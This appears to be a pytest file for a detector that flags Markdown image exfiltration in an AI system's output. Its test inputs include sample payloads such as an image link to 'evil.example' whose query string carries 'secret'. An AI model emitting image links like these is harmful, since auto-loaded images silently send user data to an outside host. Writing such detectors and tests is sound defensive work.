"""Tests for app/detectors/output_detector.py (TODO 1.5c: Markdown image exfiltration)."""

from app.detectors.output_detector import OutputDetector

ALLOWLIST = ("acme.fr",)


def test_markdown_image_to_external_host_true_positive():
    result = OutputDetector(ALLOWLIST).detect("Done! ![x](https://evil.example/p.png?q=secret)")
    assert result["findings"] == ["markdown_image_exfil"]
    assert result["exfil_hosts"] == ["evil.example"]


def test_markdown_image_to_allowlisted_host_false_positive():
    assert OutputDetector(ALLOWLIST).detect("![logo](https://intranet.acme.fr/logo.png)")["findings"] == []


def test_plain_link_is_not_an_image():
    # A normal link needs a click; unapproved links are the indirect detector's job.
    assert OutputDetector(ALLOWLIST).detect("[portal](https://evil.example)")["findings"] == []


def test_angle_bracket_and_spaces_variant():
    assert OutputDetector(ALLOWLIST).detect("![ a ]( <https://evil.example/t.gif?d=1> )")["findings"] == [
        "markdown_image_exfil"
    ]
